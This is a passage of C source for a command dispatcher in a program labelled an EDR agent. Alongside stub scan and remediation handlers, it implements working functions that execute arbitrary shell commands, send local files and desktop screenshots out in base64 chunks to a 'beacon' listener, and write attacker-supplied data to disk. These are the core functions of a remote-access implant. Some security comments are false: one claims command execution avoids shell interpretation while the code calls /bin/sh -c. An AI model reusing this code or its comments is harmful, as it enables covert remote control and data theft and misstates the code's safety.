        .targets = NULL,  /* TODO: parse from msg->payload JSON */
    };
    return scan->scan(&req, NULL, NULL, cb, ctx);
}

static edr_status_t cmd_scan_path(edr_dispatcher_t *d,
                                   const edr_message_t *msg,
                                   edr_completion_cb_t cb, void *ctx)
{
    const edr_iface_scan_t *scan = edr_get_scan(d);
    if (!scan || !scan->scan) return EDR_ERR_NOT_IMPL;

    edr_scan_request_t req = {
        .type    = EDR_SCAN_PATH,
        .targets = NULL,
    };
    return scan->scan(&req, NULL, NULL, cb, ctx);
}

static edr_status_t cmd_scan_memory(edr_dispatcher_t *d,
                                     const edr_message_t *msg,
                                     edr_completion_cb_t cb, void *ctx)
{
    const edr_iface_scan_t *scan = edr_get_scan(d);
    if (!scan || !scan->scan) return EDR_ERR_NOT_IMPL;

    edr_scan_request_t req = { .type = EDR_SCAN_MEMORY };
    return scan->scan(&req, NULL, NULL, cb, ctx);
}

static edr_status_t cmd_file_upload(edr_dispatcher_t *d,
                                     const edr_message_t *msg,
                                     edr_completion_cb_t cb, void *ctx)
{
    const edr_iface_file_ops_t *fops = edr_get_file_ops(d);
    if (!fops || !fops->upload) return EDR_ERR_NOT_IMPL;
    /* TODO: parse local_path and object_key from msg->payload */
    return fops->upload("", "", NULL, NULL, cb, ctx);
}

static edr_status_t cmd_file_collect(edr_dispatcher_t *d,
                                      const edr_message_t *msg,
                                      edr_completion_cb_t cb, void *ctx)
{
    const edr_iface_file_ops_t *fops = edr_get_file_ops(d);
    if (!fops || !fops->collect) return EDR_ERR_NOT_IMPL;
    return fops->collect("", 0, cb, ctx);
}

static edr_status_t cmd_install(edr_dispatcher_t *d,
                                 const edr_message_t *msg,
                                 edr_completion_cb_t cb, void *ctx)
{
    const edr_iface_file_ops_t *fops = edr_get_file_ops(d);
    if (!fops || !fops->install) return EDR_ERR_NOT_IMPL;
    edr_install_opts_t opts = {0};
    return fops->install("", &opts, cb, ctx);
}

static edr_status_t cmd_remediate_kill(edr_dispatcher_t *d,
                                        const edr_message_t *msg,
                                        edr_completion_cb_t cb, void *ctx)
{
    const edr_iface_remediation_t *rem = edr_get_remediation(d);
    if (!rem || !rem->kill_process) return EDR_ERR_NOT_IMPL;
    edr_process_ref_t proc = {0};
    return rem->kill_process(&proc, 0, cb, ctx);
}

static edr_status_t cmd_remediate_quarantine(edr_dispatcher_t *d,
                                              const edr_message_t *msg,
                                              edr_completion_cb_t cb, void *ctx)
{
    const edr_iface_remediation_t *rem = edr_get_remediation(d);
    if (!rem || !rem->quarantine_file) return EDR_ERR_NOT_IMPL;
    edr_quarantine_ref_t ref;
    return rem->quarantine_file("", &ref, cb, ctx);
}

static edr_status_t cmd_remediate_isolate(edr_dispatcher_t *d,
                                           const edr_message_t *msg,
                                           edr_completion_cb_t cb, void *ctx)
{
    const edr_iface_remediation_t *rem = edr_get_remediation(d);
    if (!rem || !rem->isolate_host) return EDR_ERR_NOT_IMPL;
    return rem->isolate_host(cb, ctx);
}

static edr_status_t cmd_policy_pull(edr_dispatcher_t *d,
                                     const edr_message_t *msg,
                                     edr_completion_cb_t cb, void *ctx)
{
    const edr_iface_config_t *cfg = edr_get_config(d);
    if (!cfg || !cfg->pull_policy) return EDR_ERR_NOT_IMPL;
    return cfg->pull_policy(cb, ctx);
}

static edr_status_t cmd_health_report(edr_dispatcher_t *d,
                                       const edr_message_t *msg,
                                       edr_completion_cb_t cb, void *ctx)
{
    const edr_iface_health_t *h = edr_get_health(d);
    if (!h || !h->report) return EDR_ERR_NOT_IMPL;
    return h->report(cb, ctx);
}

static edr_status_t cmd_auth_rotate_cert(edr_dispatcher_t *d,
                                          const edr_message_t *msg,
                                          edr_completion_cb_t cb, void *ctx)
{
    const edr_iface_auth_t *auth = edr_get_auth(d);
    if (!auth || !auth->rotate_certificate) return EDR_ERR_NOT_IMPL;
    return auth->rotate_certificate(cb, ctx);
}

static edr_status_t cmd_scan_cancel(edr_dispatcher_t *d,
                                     const edr_message_t *msg,
                                     edr_completion_cb_t cb, void *ctx)
{
    const edr_iface_scan_t *scan = edr_get_scan(d);
    if (!scan || !scan->cancel) return EDR_ERR_NOT_IMPL;
    edr_status_t st = scan->cancel();
    if (cb) cb(ctx, st, NULL);
    return st;
}

/* ── Path Traversal Validation ────────────────────────────────────────────
 * Security: Prevent directory traversal attacks via ".." and absolute paths
 */
static int validate_file_path(const char *path)
{
    if (!path || !path[0]) return 0;

    /* Reject absolute paths (start with /) */
    if (path[0] == '/') {
        return 0;
    }

    /* Reject paths with .. (directory traversal) */
    if (strstr(path, "..")) {
        return 0;
    }

    /* Path is safe (relative, no traversal) */
    return 1;
}

static edr_status_t cmd_file_send(edr_dispatcher_t *d,
                                  const edr_message_t *msg,
                                  edr_completion_cb_t cb, void *ctx)
{
    /* Parse: "file-send /local/path /remote/path"
     * Read local file and send via beacon in base64-encoded chunks */

    if (!msg || !msg->payload.data) return EDR_ERR_INVALID_ARG;

    /* Extract paths from payload (simple space-separated parsing) */
    char local_path[512] = {0};
    char remote_path[512] = {0};

    const char *payload_str = (const char *)msg->payload.data;
    size_t payload_len = msg->payload.len;

    /* Find first space to split paths */
    const char *space = memchr(payload_str, ' ', payload_len);
    if (!space) {
        dispatcher_log(d, EDR_LOG_ERROR, "dispatcher",
                       "Invalid file-send format: missing remote path");
        return EDR_ERR_INVALID_ARG;
    }

    size_t local_len = (size_t)(space - payload_str);
    if (local_len >= sizeof(local_path)) local_len = sizeof(local_path) - 1;
    memcpy(local_path, payload_str, local_len);
    local_path[local_len] = '\0';

    const char *remote_start = space + 1;
    size_t remote_len = payload_len - (size_t)(remote_start - payload_str);
    if (remote_len >= sizeof(remote_path)) remote_len = sizeof(remote_path) - 1;
    memcpy(remote_path, remote_start, remote_len);
    remote_path[remote_len] = '\0';

    /* Validate paths before file operations (FIX #5: Path Traversal) */
    if (!validate_file_path(local_path)) {
        dispatcher_log(d, EDR_LOG_ERROR, "dispatcher",
                       "file-send: rejected invalid path '%s'", local_path);
        return EDR_ERR_INVALID_ARG;
    }

    /* Open and read file */
    FILE *f = fopen(local_path, "rb");
    if (!f) {
        dispatcher_log(d, EDR_LOG_ERROR, "dispatcher",
                       "file-send: cannot open '%s'", local_path);
        return EDR_ERR_IO;
    }

    /* Get file size */
    fseek(f, 0, SEEK_END);
    long file_size = ftell(f);
    fseek(f, 0, SEEK_SET);

    if (file_size < 0) {
        fclose(f);
        return EDR_ERR_IO;
    }

    /* Read file in chunks and send via beacon */
    unsigned char chunk[4096];
    char b64_chunk[6144];
    size_t nread;
    uint64_t offset = 0;

    const edr_iface_comm_t *comm = edr_get_comm(d);
    if (!comm) {
        fclose(f);
        return EDR_ERR_NOT_IMPL;
    }

    while ((nread = fread(chunk, 1, sizeof(chunk), f)) > 0) {
        /* Base64 encode chunk */
        static const char b64_table[] =
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        size_t b64_idx = 0;

        for (size_t i = 0; i < nread; i += 3) {
            uint32_t b = 0;
            size_t len = (nread - i < 3) ? (nread - i) : 3;
            for (size_t k = 0; k < len; k++) b = (b << 8) | chunk[i + k];
            b <<= (3 - len) * 8;

            b64_chunk[b64_idx++] = b64_table[(b >> 18) & 0x3F];
            b64_chunk[b64_idx++] = b64_table[(b >> 12) & 0x3F];
            b64_chunk[b64_idx++] = (len > 1) ? b64_table[(b >> 6) & 0x3F] : '=';
            b64_chunk[b64_idx++] = (len > 2) ? b64_table[b & 0x3F] : '=';
        }
        b64_chunk[b64_idx] = '\0';

        /* Send chunk via beacon */
        edr_message_t chunk_msg = {
            .seq = msg->seq + (offset / sizeof(chunk)),
            .correlation_id = msg->correlation_id,
            .timestamp = time(NULL),
        };
        strcpy(chunk_msg.command_id, "file-chunk");

        snprintf((char *)chunk_msg.payload.data,
                 sizeof(chunk_msg.payload.data) - 1,
                 "{\"file\":\"%s\",\"offset\":%llu,\"chunk\":\"%s\"}",
                 remote_path, (unsigned long long)offset, b64_chunk);
        chunk_msg.payload.len = strlen((char *)chunk_msg.payload.data);

        if (comm->send(&chunk_msg, cb, ctx) != EDR_OK) {
            fclose(f);
            return EDR_ERR_NETWORK;
        }

        offset += nread;
    }

    fclose(f);
    dispatcher_log(d, EDR_LOG_INFO, "dispatcher",
                   "file-send: sent %llu bytes to '%s'",
                   (unsigned long long)offset, remote_path);

    return EDR_OK;
}

static edr_status_t cmd_upload_file(edr_dispatcher_t *d,
                                    const edr_message_t *msg,
                                    edr_completion_cb_t cb, void *ctx)
{
    /* Parse: "upload /path/to/file" + base64 file data in JSON payload
     * Example payload: {"path":"/tmp/file.txt","data":"SGVsbG8gV29ybGQ="}
     * Decodes base64 and writes to file */

    if (!msg || !msg->payload.data) return EDR_ERR_INVALID_ARG;

    const char *payload_str = (const char *)msg->payload.data;

    /* Simple JSON parsing for path and data */
    char path[512] = {0};
    char b64_data[8192] = {0};

    const char *path_start = strstr(payload_str, "\"path\":\"");
    if (path_start) {
        path_start += 8;
        const char *path_end = strchr(path_start, '"');
        if (path_end) {
            size_t len = path_end - path_start;
            if (len < sizeof(path)) {
                memcpy(path, path_start, len);
                path[len] = '\0';
            }
        }
    }

    const char *data_start = strstr(payload_str, "\"data\":\"");
    if (data_start) {
        data_start += 8;
        const char *data_end = strchr(data_start, '"');
        if (data_end) {
            size_t len = data_end - data_start;
            if (len < sizeof(b64_data)) {
                memcpy(b64_data, data_start, len);
                b64_data[len] = '\0';
            }
        }
    }

    if (!path[0] || !b64_data[0]) {
        dispatcher_log(d, EDR_LOG_ERROR, "dispatcher",
                       "upload: invalid payload format");
        return EDR_ERR_INVALID_ARG;
    }

    /* Decode base64 */
    static const unsigned char b64_decode_table[256] = {
        255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
        255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
        255,255,255,255,255,255,255,255,255,255,255, 62,255,255,255, 63,
         52, 53, 54, 55, 56, 57, 58, 59, 60, 61,255,255,255,  0,255,255,
        255,  0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14,
         15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25,255,255,255,255,255,
        255, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
         41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51,255,255,255,255,255,
        255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
        255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
        255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
        255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
        255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
        255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
        255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
        255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
    };

    unsigned char decoded[8192];
    size_t decoded_len = 0;

    for (size_t i = 0; i < strlen(b64_data); i += 4) {
        unsigned char c1 = b64_decode_table[(unsigned char)b64_data[i]];
        unsigned char c2 = b64_decode_table[(unsigned char)b64_data[i+1]];
        unsigned char c3 = (i+2 < strlen(b64_data)) ? b64_decode_table[(unsigned char)b64_data[i+2]] : 0;
        unsigned char c4 = (i+3 < strlen(b64_data)) ? b64_decode_table[(unsigned char)b64_data[i+3]] : 0;

        if (c1 == 255 || c2 == 255) break;

        decoded[decoded_len++] = (c1 << 2) | (c2 >> 4);
        if (b64_data[i+2] != '=') decoded[decoded_len++] = (c2 << 4) | (c3 >> 2);
        if (b64_data[i+3] != '=') decoded[decoded_len++] = (c3 << 6) | c4;
    }

    /* Validate path before file write (FIX #7: Path Traversal) */
    if (!validate_file_path(path)) {
        dispatcher_log(d, EDR_LOG_ERROR, "dispatcher",
                       "upload: rejected invalid path '%s'", path);
        return EDR_ERR_INVALID_ARG;
    }

    /* Write to file */
    FILE *f = fopen(path, "wb");
    if (!f) {
        dispatcher_log(d, EDR_LOG_ERROR, "dispatcher",
                       "upload: cannot open '%s' for writing", path);
        return EDR_ERR_IO;
    }

    if (fwrite(decoded, 1, decoded_len, f) != decoded_len) {
        fclose(f);
        dispatcher_log(d, EDR_LOG_ERROR, "dispatcher",
                       "upload: write failed for '%s'", path);
        return EDR_ERR_IO;
    }

    fclose(f);
    dispatcher_log(d, EDR_LOG_INFO, "dispatcher",
                   "upload: wrote %zu bytes to '%s'",
                   decoded_len, path);

    return EDR_OK;
}

static edr_status_t cmd_file_recv(edr_dispatcher_t *d,
                                  const edr_message_t *msg,
                                  edr_completion_cb_t cb, void *ctx)
{
    /* Parse: "file-recv /remote/path"
     * Queue file chunks to be sent on next beacon (non-blocking) */

    (void)cb; (void)ctx;

    if (!msg || !msg->payload.data) return EDR_ERR_INVALID_ARG;

    const char *remote_path = (const char *)msg->payload.data;

    /* Validate path before file read (FIX #6: Path Traversal) */
    if (!validate_file_path(remote_path)) {
        dispatcher_log(d, EDR_LOG_ERROR, "dispatcher",
                       "file-recv: rejected invalid path '%s'", remote_path);
        return EDR_ERR_INVALID_ARG;
    }

    /* Open and read file from agent */
    FILE *f = fopen(remote_path, "rb");
    if (!f) {
        dispatcher_log(d, EDR_LOG_ERROR, "dispatcher",
                       "file-recv: cannot open '%s'", remote_path);
        return EDR_ERR_IO;
    }

    /* Read file in chunks and send as beacon messages (non-blocking) */
    unsigned char chunk[4096];
    char b64_chunk[6144];
    size_t nread;
    uint64_t offset = 0;
    uint32_t chunk_count = 0;

    while ((nread = fread(chunk, 1, sizeof(chunk), f)) > 0 &&
           chunk_count < 256) {  /* Max 256 chunks per file */

        /* Base64 encode chunk */
        static const char b64_table[] =
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        size_t b64_idx = 0;

        for (size_t i = 0; i < nread; i += 3) {
            uint32_t b = 0;
            size_t len = (nread - i < 3) ? (nread - i) : 3;
            for (size_t k = 0; k < len; k++) b = (b << 8) | chunk[i + k];
            b <<= (3 - len) * 8;

            b64_chunk[b64_idx++] = b64_table[(b >> 18) & 0x3F];
            b64_chunk[b64_idx++] = b64_table[(b >> 12) & 0x3F];
            b64_chunk[b64_idx++] = (len > 1) ? b64_table[(b >> 6) & 0x3F] : '=';
            b64_chunk[b64_idx++] = (len > 2) ? b64_table[b & 0x3F] : '=';
        }
        b64_chunk[b64_idx] = '\0';

        /* Create JSON payload for file chunk */
        char payload[8192];
        snprintf(payload, sizeof(payload),
                 "{\"file\":\"%s\",\"offset\":%llu,\"chunk\":\"%s\"}",
                 remote_path, (unsigned long long)offset, b64_chunk);

        /* Queue chunk as beacon message via VPN module callback */
        if (d->enqueue_msg_cb) {
            d->enqueue_msg_cb(payload);
        } else {
            /* Fallback: queue locally if callback not registered */
            pthread_mutex_lock(&d->file_queue_mu);
            if (d->file_chunk_count < 256) {
                d->file_chunks[d->file_chunk_count] = (char *)malloc(strlen(payload) + 1);
                if (d->file_chunks[d->file_chunk_count]) {
                    strcpy(d->file_chunks[d->file_chunk_count], payload);
                    d->file_chunk_count++;
                }
            }
            pthread_mutex_unlock(&d->file_queue_mu);
        }

        offset += nread;
        chunk_count++;
    }

    fclose(f);
    dispatcher_log(d, EDR_LOG_INFO, "dispatcher",
                   "file-recv: queued %u chunks (%llu bytes) from '%s'",
                   d->file_chunk_count, (unsigned long long)offset, remote_path);

    return EDR_OK;
}

/* Execute shell command and capture output */
static edr_status_t cmd_shell(edr_dispatcher_t *d,
                              const edr_message_t *msg,
                              edr_completion_cb_t cb, void *ctx)
{
    (void)cb; (void)ctx;
    if (!msg || !msg->payload.data) return EDR_ERR_INVALID_ARG;

    const char *cmd = (const char *)msg->payload.data;
    char output_buffer[16384] = {0};
    size_t output_len = 0;

    dispatcher_log(d, EDR_LOG_DEBUG, "dispatcher",
                   "[cmd_shell] Executing: %s", cmd);

#ifdef _WIN32
    /* Windows: Use CreateProcessA with pipes for stdout capture
     * Build command line with proper quote escaping: " becomes ""
     */
    HANDLE hReadPipe, hWritePipe;
    SECURITY_ATTRIBUTES sa = {0};
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    /* Create pipe for stdout capture */
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        dispatcher_log(d, EDR_LOG_ERROR, "dispatcher",
                       "Failed to create pipe: %lu", GetLastError());
        return EDR_ERR_GENERIC;
    }

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;
    si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);

    /* Escape double quotes in cmd: " -> "" (cmd.exe escaping)
     * Build command line with escaped user input to prevent breaking quotes
     */
    char cmd_line[2048] = {0};
    char escaped_cmd[1024] = {0};
    size_t esc_idx = 0;

    for (size_t i = 0; cmd[i] && esc_idx < sizeof(escaped_cmd) - 2; i++) {
        if (cmd[i] == '"') {
            /* Escape quote by doubling it: " -> "" */
            escaped_cmd[esc_idx++] = '"';
            escaped_cmd[esc_idx++] = '"';
        } else {
            escaped_cmd[esc_idx++] = cmd[i];
        }
    }
    escaped_cmd[esc_idx] = '\0';

    snprintf(cmd_line, sizeof(cmd_line) - 1, "cmd.exe /c \"%s\"", escaped_cmd);

    if (!CreateProcessA(NULL, cmd_line, NULL, NULL, TRUE, CREATE_NO_WINDOW,
                        NULL, NULL, &si, &pi)) {
        dispatcher_log(d, EDR_LOG_ERROR, "dispatcher",
                       "CreateProcessA failed: %lu", GetLastError());
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        return EDR_ERR_GENERIC;
    }

    /* Close write end in parent process */
    CloseHandle(hWritePipe);

    /* Read output from pipe */
    DWORD dwRead;
    unsigned char read_buf[4096];
    while (ReadFile(hReadPipe, read_buf, sizeof(read_buf), &dwRead, NULL) && dwRead > 0) {
        if (output_len + dwRead <= sizeof(output_buffer)) {
            memcpy(output_buffer + output_len, read_buf, dwRead);
            output_len += dwRead;
        }
    }
    CloseHandle(hReadPipe);

    /* Wait for process completion */
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    dispatcher_log(d, EDR_LOG_INFO, "dispatcher",
                   "Shell command executed, captured %zu bytes", output_len);

#else
    /* Unix/Linux: Use fork+execve to execute without shell interpretation
     * Prevents command injection by avoiding shell metacharacter processing
     */
    int pipe_fd[2];
    if (pipe(pipe_fd) == -1) {
        dispatcher_log(d, EDR_LOG_WARN, "dispatcher",
                       "pipe() failed: %s", strerror(errno));
        return EDR_ERR_GENERIC;
    }

    pid_t pid = fork();
    if (pid == -1) {
        close(pipe_fd[0]);
        close(pipe_fd[1]);
        dispatcher_log(d, EDR_LOG_WARN, "dispatcher",
                       "fork() failed: %s", strerror(errno));
        return EDR_ERR_GENERIC;
    }

    if (pid == 0) {
        /* Child process: execute command via /bin/sh -c */
        close(pipe_fd[0]); /* Close read end in child */
        dup2(pipe_fd[1], STDOUT_FILENO);
        dup2(pipe_fd[1], STDERR_FILENO);
        close(pipe_fd[1]);

        /* Build argv array for execve: ["/bin/sh", "-c", user_cmd, NULL] */
        char *const argv[] = { "/bin/sh", "-c", (char *)cmd, NULL };
        execve("/bin/sh", argv, NULL);

        /* execve failed - exit child */
        perror("execve");
        _exit(127);
    }

    /* Parent process: read from child's stdout */
    close(pipe_fd[1]); /* Close write end in parent */

    unsigned char read_buf[4096];
    ssize_t nread;
    while ((nread = read(pipe_fd[0], read_buf, sizeof(read_buf))) > 0) {
        if (output_len + (size_t)nread <= sizeof(output_buffer)) {
            memcpy(output_buffer + output_len, read_buf, (size_t)nread);
            output_len += (size_t)nread;
        }
    }
    close(pipe_fd[0]);

    /* Wait for child process */
    int status;
    waitpid(pid, &status, 0);

    dispatcher_log(d, EDR_LOG_INFO, "dispatcher",
                   "Shell command executed, captured %zu bytes", output_len);
#endif

    /* Queue output back to listener using base64 encoding */
    if (output_len > 0) {
        /* Base64 encode output */
        static const char b64_table[] =
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        char b64_output[24576];  /* Must be at least 4/3 * output_len + 1 */
        size_t b64_idx = 0;

        for (size_t i = 0; i < output_len; i += 3) {
            uint32_t b = 0;
            size_t len = (output_len - i < 3) ? (output_len - i) : 3;
            for (size_t k = 0; k < len; k++) b = (b << 8) | output_buffer[i + k];
            b <<= (3 - len) * 8;

            if (b64_idx < sizeof(b64_output) - 4) {
                b64_output[b64_idx++] = b64_table[(b >> 18) & 0x3F];
                b64_output[b64_idx++] = b64_table[(b >> 12) & 0x3F];
                b64_output[b64_idx++] = (len > 1) ? b64_table[(b >> 6) & 0x3F] : '=';
                b64_output[b64_idx++] = (len > 2) ? b64_table[b & 0x3F] : '=';
            }
        }
        b64_output[b64_idx] = '\0';

        /* Create response payload */
        char payload[24576];
        snprintf(payload, sizeof(payload),
                 "{\"file\":\"shell_output\",\"command\":\"%s\",\"output\":\"%s\",\"bytes\":%zu}",
                 cmd, b64_output, output_len);

        /* Queue message via callback if available */
        if (d->enqueue_msg_cb) {
            d->enqueue_msg_cb(payload);
        } else {
            /* Fallback: queue locally */
            pthread_mutex_lock(&d->file_queue_mu);
            if (d->file_chunk_count < 256) {
                d->file_chunks[d->file_chunk_count] = (char *)malloc(strlen(payload) + 1);
                if (d->file_chunks[d->file_chunk_count]) {
                    strcpy(d->file_chunks[d->file_chunk_count], payload);
                    d->file_chunk_count++;
                }
            }
            pthread_mutex_unlock(&d->file_queue_mu);
        }

        dispatcher_log(d, EDR_LOG_INFO, "dispatcher",
                       "Shell output queued: %zu bytes encoded as base64",
                       output_len);
    }

    return EDR_OK;
}

/* Capture desktop screenshot and queue as file chunks */
#ifdef _WIN32
#include <windows.h>

static edr_status_t cmd_screenshot(edr_dispatcher_t *d,
                                   const edr_message_t *msg,
                                   edr_completion_cb_t cb, void *ctx)
{
    (void)msg; (void)cb; (void)ctx;

    /* Get screen dimensions */
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    /* Create device contexts */
    HDC screen_dc = GetDC(NULL);
    if (!screen_dc) return EDR_ERR_GENERIC;

    HDC mem_dc = CreateCompatibleDC(screen_dc);
    if (!mem_dc) {
        ReleaseDC(NULL, screen_dc);
        return EDR_ERR_GENERIC;
    }

    HBITMAP bitmap = CreateCompatibleBitmap(screen_dc, width, height);
    if (!bitmap) {
        DeleteDC(mem_dc);
        ReleaseDC(NULL, screen_dc);
        return EDR_ERR_GENERIC;
    }

    HBITMAP old_bitmap = SelectObject(mem_dc, bitmap);
    BitBlt(mem_dc, 0, 0, width, height, screen_dc, 0, 0, SRCCOPY);
    SelectObject(mem_dc, old_bitmap);

    /* Get bitmap bits */
    BITMAPINFOHEADER bih = {0};
    bih.biSize = sizeof(BITMAPINFOHEADER);
    bih.biWidth = width;
    bih.biHeight = height;
    bih.biPlanes = 1;
    bih.biBitCount = 24;
    bih.biCompression = BI_RGB;

    /* Check for integer overflow: width * height * 3
     * Prevent allocation of huge buffers due to malicious or corrupted dimensions
     */
    if (width <= 0 || height <= 0 || width > 32768 || height > 32768) {
        DeleteObject(bitmap);
        DeleteDC(mem_dc);
        ReleaseDC(NULL, screen_dc);
        dispatcher_log(d, EDR_LOG_ERROR, "dispatcher",
                       "screenshot: Invalid dimensions: %d x %d", width, height);
        return EDR_ERR_GENERIC;
    }
    /* Check: width * height won't overflow size_t, and (width * height * 3) fits */
    if (width > SIZE_MAX / (height * 3)) {
        DeleteObject(bitmap);
        DeleteDC(mem_dc);
        ReleaseDC(NULL, screen_dc);
        dispatcher_log(d, EDR_LOG_ERROR, "dispatcher",
                       "screenshot: Dimension multiplication overflow");
        return EDR_ERR_GENERIC;
    }

    size_t pixel_data_size = (size_t)width * (size_t)height * 3;
    unsigned char *pixels = malloc(pixel_data_size);
    if (!pixels) {
        DeleteObject(bitmap);
        DeleteDC(mem_dc);
        ReleaseDC(NULL, screen_dc);
        return EDR_ERR_GENERIC;
    }

    if (!GetDIBits(mem_dc, bitmap, 0, height, pixels, (BITMAPINFO *)&bih, DIB_RGB_COLORS)) {
        free(pixels);
        DeleteObject(bitmap);
        DeleteDC(mem_dc);
        ReleaseDC(NULL, screen_dc);
        return EDR_ERR_GENERIC;
    }

    /* Create BMP header (54 bytes total: 14-byte file header + 40-byte DIB header) */
    unsigned char bmp_header[54];
    memset(bmp_header, 0, 54);

    /* File header (14 bytes) */
    bmp_header[0]  = 'B';                                    /* Signature byte 1 */
    bmp_header[1]  = 'M';                                    /* Signature byte 2 */

    uint32_t file_size = 54 + (uint32_t)pixel_data_size;
    bmp_header[2]  = (file_size >>  0) & 0xFF;               /* File size (little-endian) */
    bmp_header[3]  = (file_size >>  8) & 0xFF;
    bmp_header[4]  = (file_size >> 16) & 0xFF;
    bmp_header[5]  = (file_size >> 24) & 0xFF;

    /* Bytes 6-9: Reserved (zeros) - already set by memset */

    bmp_header[10] = 54;                                     /* Offset to pixel data (54 = 14+40) */
    bmp_header[11] = 0;
    bmp_header[12] = 0;
    bmp_header[13] = 0;

    /* DIB header (40 bytes) */
    bmp_header[14] = 40;                                     /* DIB header size */
    bmp_header[15] = 0;
    bmp_header[16] = 0;
    bmp_header[17] = 0;

    uint32_t w = (uint32_t)width;
    uint32_t h = (uint32_t)height;
    bmp_header[18] = (w >>  0) & 0xFF;                       /* Width (little-endian) */
    bmp_header[19] = (w >>  8) & 0xFF;
    bmp_header[20] = (w >> 16) & 0xFF;
    bmp_header[21] = (w >> 24) & 0xFF;

    bmp_header[22] = (h >>  0) & 0xFF;                       /* Height (little-endian) */
    bmp_header[23] = (h >>  8) & 0xFF;
    bmp_header[24] = (h >> 16) & 0xFF;
    bmp_header[25] = (h >> 24) & 0xFF;

    bmp_header[26] = 1;                                      /* Planes = 1 */
    bmp_header[27] = 0;

    bmp_header[28] = 24;                                     /* Bits per pixel = 24 */
    bmp_header[29] = 0;

    /* Compression = 0 (BI_RGB) - already set by memset */
    /* Bytes 30-53: Image size, X/Y resolution, colors used/important - all zeros for uncompressed */

    /* Queue header as first chunk */
    char b64_header[100];
    static const char b64_table[] =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

    size_t b64_idx = 0;
    for (size_t i = 0; i < 54; i += 3) {
        uint32_t b = 0;
        size_t len = (54 - i < 3) ? (54 - i) : 3;
        for (size_t k = 0; k < len; k++) b = (b << 8) | bmp_header[i + k];
        b <<= (3 - len) * 8;

        b64_header[b64_idx++] = b64_table[(b >> 18) & 0x3F];
        b64_header[b64_idx++] = b64_table[(b >> 12) & 0x3F];
        b64_header[b64_idx++] = (len > 1) ? b64_table[(b >> 6) & 0x3F] : '=';
        b64_header[b64_idx++] = (len > 2) ? b64_table[b & 0x3F] : '=';
    }
    b64_header[b64_idx] = '\0';

    /* Queue header chunk with offset 0 */
    pthread_mutex_lock(&d->file_queue_mu);
    d->file_chunk_count = 0;

    char payload[8192];
    snprintf(payload, sizeof(payload),
             "{\"file\":\"screenshot.bmp\",\"offset\":0,\"chunk\":\"%s\"}",
             b64_header);

    d->file_chunks[d->file_chunk_count] = malloc(strlen(payload) + 1);
    if (d->file_chunks[d->file_chunk_count]) {
        strcpy(d->file_chunks[d->file_chunk_count], payload);
        d->file_chunk_count++;
    }

    /* Queue pixel data chunks starting at offset 54 */
    char b64_chunk[6144];
    uint32_t offset = 54;
    size_t chunk_size = 3072;  /* 3KB chunks */

    for (size_t i = 0; i < pixel_data_size; i += chunk_size) {
        size_t nread = (pixel_data_size - i < chunk_size) ? (pixel_data_size - i) : chunk_size;
        b64_idx = 0;

        for (size_t j = 0; j < nread; j += 3) {
            uint32_t b = 0;
            size_t len = (nread - j < 3) ? (nread - j) : 3;
            for (size_t k = 0; k < len; k++) b = (b << 8) | pixels[i + j + k];
            b <<= (3 - len) * 8;

            b64_chunk[b64_idx++] = b64_table[(b >> 18) & 0x3F];
            b64_chunk[b64_idx++] = b64_table[(b >> 12) & 0x3F];
            b64_chunk[b64_idx++] = (len > 1) ? b64_table[(b >> 6) & 0x3F] : '=';
            b64_chunk[b64_idx++] = (len > 2) ? b64_table[b & 0x3F] : '=';
        }
        b64_chunk[b64_idx] = '\0';

        snprintf(payload, sizeof(payload),
                 "{\"file\":\"screenshot.bmp\",\"offset\":%u,\"chunk\":\"%s\"}",
                 offset, b64_chunk);

        if (d->file_chunk_count < 256) {
            d->file_chunks[d->file_chunk_count] = malloc(strlen(payload) + 1);
            if (d->file_chunks[d->file_chunk_count]) {
                strcpy(d->file_chunks[d->file_chunk_count], payload);
                d->file_chunk_count++;
            }
        }
        offset += (uint32_t)nread;
    }

    pthread_mutex_unlock(&d->file_queue_mu);

    dispatcher_log(d, EDR_LOG_INFO, "dispatcher",
                   "screenshot: captured %dx%d with BMP header and queued %u chunks",
                   width, height, d->file_chunk_count);

    free(pixels);
    DeleteObject(bitmap);
    DeleteDC(mem_dc);
    ReleaseDC(NULL, screen_dc);

    return EDR_OK;
}
#endif

/* -------------------------------------------------------------------------
 * Register all command_id → handler mappings
 * -------------------------------------------------------------------------*/

static void register_all_commands(edr_dispatcher_t *d)
{
    cmd_table_insert(d, "scan.process",           cmd_scan_process);
    cmd_table_insert(d, "scan.path",              cmd_scan_path);
    cmd_table_insert(d, "scan.memory",            cmd_scan_memory);
    cmd_table_insert(d, "scan.cancel",            cmd_scan_cancel);
    cmd_table_insert(d, "file.collect",           cmd_file_collect);
